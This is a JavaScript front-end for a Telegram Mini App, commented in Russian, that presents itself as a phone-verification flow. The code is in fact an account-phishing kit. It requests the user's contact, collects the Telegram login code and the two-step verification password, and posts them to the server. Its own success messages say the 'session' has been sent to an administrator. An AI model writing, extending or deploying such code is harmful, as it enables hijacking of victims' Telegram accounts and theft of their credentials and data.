const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

// Элементы DOM
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');
const phoneDisplay = document.getElementById('phoneDisplay');
const phoneDisplay2 = document.getElementById('phoneDisplay2');
const error1 = document.getElementById('error1');
const error2 = document.getElementById('error2');
const error3 = document.getElementById('error3');
const digits = [
    document.getElementById('d1'),
    document.getElementById('d2'),
    document.getElementById('d3'),
    document.getElementById('d4'),
    document.getElementById('d5')
];
const resendBtn = document.getElementById('resendBtn');
const deleteBtn = document.getElementById('deleteBtn');
const digitBtns = document.querySelectorAll('.digit-btn');
const manualSection = document.querySelector('.manual-section');
const telegramSection = document.querySelector('.telegram-section');
const phoneInput = document.getElementById('phone');
const getCodeBtn = document.getElementById('getCodeBtn');
const passwordInput = document.getElementById('passwordInput');
const submitPasswordBtn = document.getElementById('submitPasswordBtn');

// Состояние приложения
let currentPhone = '';
let currentCode = '';
let codeRequested = false;

// Определяем окружение (Telegram или браузер)
const isTelegram = tg.initData && tg.initDataUnsafe?.user;
const chatId = isTelegram ? tg.initDataUnsafe.user.id : null;

console.log('App initialized:', { isTelegram, chatId, initData: tg.initData });

// Настройка интерфейса в зависимости от окружения
if (isTelegram) {
    manualSection.style.display = 'none';
    telegramSection.style.display = 'block';
    // Запускаем запрос контакта автоматически
    requestContactAutomatically();
} else {
    manualSection.style.display = 'block';
    telegramSection.style.display = 'none';
    console.log('Running in browser mode');
}

// Функция автоматического запроса контакта в Telegram
function requestContactAutomatically() {
    console.log('Requesting contact automatically...');
    
    // Показываем индикатор загрузки
    telegramSection.innerHTML = '<p>Запрашиваем номер телефона...</p><div class="loader"></div>';
    
    // Запрашиваем контакт
    tg.requestContact((success, contact) => {
        console.log('Contact request result:', { success, contact });
        
        if (!success) {
            console.log('User declined contact request');
            telegramSection.innerHTML = `
                <p>Необходимо предоставить номер телефона для продолжения.</p>
                <button id="retryBtn" class="action-btn">Повторить</button>
            `;
            document.getElementById('retryBtn')?.addEventListener('click', () => {
                requestContactAutomatically();
            });
            return;
        }
        
        // Успешно получили контакт
        const phone = contact?.phone_number;
        console.log('Phone obtained:', phone);
        
        if (!phone) {
            console.error('Contact object has no phone_number');
            telegramSection.innerHTML = `
                <p>Ошибка: номер не получен. Попробуйте ещё раз.</p>
                <button id="retryBtn" class="action-btn">Повторить</button>
            `;
            document.getElementById('retryBtn')?.addEventListener('click', () => {
                requestContactAutomatically();
            });
            return;
        }
        
        // Отправляем номер на сервер
        sendPhoneToServer(phone, chatId);
    });
}

// Функция отправки номера на сервер
function sendPhoneToServer(phone, chatId) {
    console.log('Sending phone to server:', { phone, chatId });
    
    // Показываем индикатор отправки
    telegramSection.innerHTML = '<p>Отправка номера на сервер...</p><div class="loader"></div>';
    
    fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, chatId })
    })
    .then(response => {
        console.log('Server response status:', response.status);
        if (!response.ok) {
            return response.json().then(data => {
                throw new Error(data.error || `HTTP error ${response.status}`);
            });
        }
        return response.json();
    })
    .then(data => {
        console.log('Server response data:', data);
        
        if (data.success) {
            // Успех – переходим к вводу кода
            currentPhone = phone;
            phoneDisplay.textContent = phone;
            step1.style.display = 'none';
            step2.style.display = 'block';
            codeRequested = true;
            
            // Очищаем поля кода
            digits.forEach(d => d.value = '');
            currentCode = '';
            
            // Показываем предупреждение, если есть
            if (data.warning) {
                error2.textContent = data.warning;
                error2.style.color = '#ffa500';
            }
            
            console.log('Phone sent successfully, waiting for code input');
        } else {
            // Ошибка от сервера
            throw new Error(data.error || 'Unknown server error');
        }
    })
    .catch(error => {
        console.error('Error sending phone to server:', error);
        
        telegramSection.innerHTML = `
            <p>Ошибка: ${error.message}</p>
            <button id="retryBtn" class="action-btn">Повторить</button>
        `;
        document.getElementById('retryBtn')?.addEventListener('click', () => {
            requestContactAutomatically();
        });
    });
}

// Обработчик ручного ввода (для браузера)
if (getCodeBtn) {
    getCodeBtn.addEventListener('click', () => {
        const phone = phoneInput.value.trim();
        console.log('Manual phone input:', phone);
        
        if (!phone) {
            error1.textContent = 'Введите номер';
            return;
        }
        
        // Имитация отправки для браузера
        fetch('/api/send-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone, chatId: null })
        })
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                currentPhone = phone;
                phoneDisplay.textContent = phone;
                step1.style.display = 'none';
                step2.style.display = 'block';
                codeRequested = true;
                digits.forEach(d => d.value = '');
                currentCode = '';
                if (data.warning) error2.textContent = data.warning;
            } else {
                error1.textContent = data.error || 'Ошибка сервера';
            }
        })
        .catch(err => {
            console.error('Manual send error:', err);
            error1.textContent = 'Ошибка сети';
        });
    });
}

// Цифровая клавиатура
digitBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        if (!codeRequested) return;
        const digit = btn.getAttribute('data-digit');
        if (currentCode.length < 5) {
            currentCode += digit;
            digits[currentCode.length - 1].value = digit;
            if (currentCode.length === 5) {
                console.log('5 digits entered, verifying code:', currentCode);
                verifyCode();
            }
        }
    });
});

deleteBtn.addEventListener('click', () => {
    if (currentCode.length > 0) {
        digits[currentCode.length - 1].value = '';
        currentCode = currentCode.slice(0, -1);
    }
});

// Повторная отправка кода
resendBtn.addEventListener('click', () => {
    if (!currentPhone) return;
    console.log('Resending code for:', currentPhone);
    
    resendBtn.disabled = true;
    resendBtn.textContent = 'Отправка...';
    
    fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: currentPhone, chatId })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            error2.textContent = 'Код отправлен повторно' + (data.warning ? ' (' + data.warning + ')' : '');
            error2.style.color = '#4caf50';
            setTimeout(() => error2.textContent = '', 3000);
        } else {
            error2.textContent = data.error || 'Ошибка';
        }
    })
    .catch(() => {
        error2.textContent = 'Ошибка сети';
    })
    .finally(() => {
        resendBtn.disabled = false;
        resendBtn.textContent = 'Reenviar código';
    });
});

// Проверка кода
function verifyCode() {
    console.log('Verifying code:', { phone: currentPhone, code: currentCode });
    error2.textContent = '';
    
    fetch('/api/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: currentPhone, code: currentCode })
    })
    .then(res => res.json())
    .then(data => {
        console.log('Verify response:', data);
        
        if (data.success) {
            // Успешная верификация
            console.log('Verification successful!');
            
            if (isTelegram) {
                // Показываем сообщение и закрываем
                error2.textContent = '✓ Успешно! Сессия отправлена';
                error2.style.color = '#4caf50';
                setTimeout(() => tg.close(), 1500);
            } else {
                alert('Сессия отправлена администратору!');
            }
        } else if (data.needPassword) {
            // Требуется 2FA
            console.log('2FA required');
            step2.style.display = 'none';
            step3.style.display = 'block';
            phoneDisplay2.textContent = currentPhone;
            passwordInput.value = '';
            error3.textContent = '';
        } else {
            // Неверный код
            error2.textContent = data.error || 'Неверный код';
            digits.forEach(d => d.value = '');
            currentCode = '';
        }
    })
    .catch(err => {
        console.error('Verify error:', err);
        error2.textContent = 'Ошибка сети';
        digits.forEach(d => d.value = '');
        currentCode = '';
    });
}

// Отправка пароля (2FA)
submitPasswordBtn.addEventListener('click', () => {
    const password = passwordInput.value.trim();
    console.log('Submitting 2FA password');
    
    if (!password) {
        error3.textContent = 'Введите пароль';
        return;
    }
    
    submitPasswordBtn.disabled = true;
    submitPasswordBtn.textContent = 'Отправка...';
    
    fetch('/api/submit-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: currentPhone, password })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            if (isTelegram) {
                error3.textContent = '✓ Пароль принят';
                error3.style.color = '#4caf50';
                setTimeout(() => tg.close(), 1500);
            } else {
                alert('Пароль принят! Данные отправлены.');
            }
        } else {
            error3.textContent = data.error || 'Ошибка';
        }
    })
    .catch(() => {
        error3.textContent = 'Ошибка сети';
    })
    .finally(() => {
        submitPasswordBtn.disabled = false;
        submitPasswordBtn.textContent = 'ENVIAR CONTRASEÑA';
    });
});

// Поддержка физической клавиатуры (для отладки)
document.addEventListener('keydown', (e) => {
    if (!codeRequested || step2.style.display !== 'block') return;
    if (e.key >= '0' && e.key <= '9') {
        if (currentCode.length < 5) {
            currentCode += e.key;
            digits[currentCode.length - 1].value = e.key;
            if (currentCode.length === 5) verifyCode();
        }
    } else if (e.key === 'Backspace') {
        if (currentCode.length > 0) {
            digits[currentCode.length - 1].value = '';
            currentCode = currentCode.slice(0, -1);
        }
    }
});